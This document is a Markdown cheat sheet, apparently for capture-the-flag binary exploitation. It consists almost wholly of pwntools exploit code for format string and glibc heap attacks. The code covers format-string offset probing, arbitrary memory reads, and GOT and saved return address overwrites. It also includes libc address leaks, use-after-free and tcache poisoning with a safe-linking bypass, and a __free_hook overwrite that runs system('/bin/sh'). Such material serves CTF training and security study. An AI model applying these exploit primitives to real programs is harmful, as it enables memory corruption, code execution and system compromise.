# Format String + Heap

## Format Recon

```text
AAAA
%p.%p.%p.%p
%x.%x.%x.%x
%s
```

```python
from pwn import *

for i in range(1, 50):
    io = process('./chall')
    io.sendline(f'%{i}$p'.encode())
    print(i, io.recvline(timeout=0.2))
    io.close()
```

## Find Offset

```python
from pwn import *

for off in range(1, 30):
    io = process('./chall')
    marker = 0x4141414242424343
    io.sendline(flat(f'%{off}$p----'.encode(), marker))
    out = io.recvrepeat(0.2)
    if b'41414142' in out or b'42424243' in out:
        print('offset', off, out)
    io.close()
```

Pwntools:

```python
autofmt = FmtStr(lambda p: exec_fmt(p))
offset = autofmt.offset
```

## Arbitrary Read

```python
def read_at(addr, fmt_off):
    payload = flat(
        f'%{fmt_off}$s.END'.encode(),
        addr,
    )
    io.sendline(payload)
    return io.recvuntil(b'.END', drop=True)
```

Put the address after the format string when null bytes break the payload.

## Writes

```python
# GOT overwrite, partial RELRO
payload = fmtstr_payload(
    offset,
    {e.got['printf']: e.symbols['win']},
    write_size='short',
)
io.sendline(payload)
```

```python
# saved RIP overwrite from stack leak
payload = fmtstr_payload(offset, {saved_rip: e.symbols['win']}, write_size='short')
io.sendline(payload)
```

```python
# same-page partial pointer overwrite
payload = fmtstr_payload(offset, {target: win & 0xffff}, write_size='short')
```

## Leak Candidates

```text
%3$p %5$p %7$p %9$p %13$p %15$p %17$p %21$p
```

```python
io.sendline(b'%13$p')
leak = int(io.recvline().strip(), 16)
libc.address = leak - LIBC_RET_OFFSET
```

## Heap Triage

1. Add two chunks, delete one, show it: UAF leak.
2. Delete same index twice: double free.
3. Edit after delete: tcache poisoning.
4. Resize and show: stale pointer / overlap.
5. Free a `>0x410` chunk and show it: unsorted-bin libc leak.

```python
def add(i, size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'Index: ', str(i).encode())
    io.sendlineafter(b'Size: ', str(size).encode())
    io.sendafter(b'Data: ', data)

def edit(i, data):
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'Index: ', str(i).encode())
    io.sendafter(b'Data: ', data)

def show(i):
    io.sendlineafter(b'> ', b'3')
    io.sendlineafter(b'Index: ', str(i).encode())

def delete(i):
    io.sendlineafter(b'> ', b'4')
    io.sendlineafter(b'Index: ', str(i).encode())
```

## Unsorted Bin Leak

```python
add(0, 0x500, b'A')
add(1, 0x20, b'B')
delete(0)
show(0)
leak = u64(io.recvn(6).ljust(8, b'\x00'))
libc.address = leak - 0x203b20  # update for libc
```

## Tcache Safe-Linking

```python
def protect(pos, ptr):
    return ptr ^ (pos >> 12)

def reveal(x, bits=64):
    p = 0
    for i in range(bits * 4, 0, -4):
        v1 = (x & (0xf << i)) >> i
        v2 = (p & (0xf << (i + 12))) >> (i + 12)
        p |= (v1 ^ v2) << i
    return p

target = e.got['free']
chunk_addr = heap_base + 0x1230
edit(victim, p64(protect(chunk_addr, target)))
```

## Older glibc Hook

```python
target = libc.symbols['__free_hook']
system = libc.symbols['system']

# poison allocation to target, then:
add(7, 0x80, p64(system))
add(8, 0x80, b'/bin/sh\x00')
delete(8)
```

On glibc 2.34+, hooks are gone. Prefer GOT, function table, `_IO_2_1_stdout_`, exit handlers, or FSOP.
